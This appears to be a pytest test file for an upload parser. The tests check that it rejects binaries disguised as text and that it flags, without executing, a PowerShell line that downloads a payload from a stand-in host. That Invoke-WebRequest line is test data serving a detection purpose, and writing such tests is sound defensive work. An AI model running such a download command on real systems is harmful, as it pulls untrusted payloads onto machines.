import pytest

from app.parsers.file_reader import (
    FileReaderError,
    read_uploaded_file,
)


def test_rejects_pe_binary_renamed_as_text():
    with pytest.raises(
        FileReaderError
    ) as exc:
        read_uploaded_file(
            "notes.txt",
            "text/plain",
            b"MZ" + b"\x00" * 100,
        )

    assert exc.value.status_code == 415


def test_rejects_generic_binary_renamed_as_text():
    with pytest.raises(
        FileReaderError
    ) as exc:
        read_uploaded_file(
            "notes.txt",
            "text/plain",
            b"hello\x00world",
        )

    assert exc.value.status_code == 415


def test_static_script_analysis_does_not_execute():
    result = read_uploaded_file(
        "update.ps1",
        "text/plain",
        (
            b"Invoke-WebRequest "
            b"https://example.test/payload "
            b"-OutFile payload.bin"
        ),
    )

    attack_types = {
        finding["attack_type"]
        for finding in result[
            "file_analysis"
        ]["findings"]
    }

    assert (
        "Script Download Primitive"
        in attack_types
    )
    assert (
        "https://example.test/payload"
        in result[
            "file_analysis"
        ]["urls"]
    )
    assert (
        result["file_analysis"][
            "executed"
        ]
        is False
    )
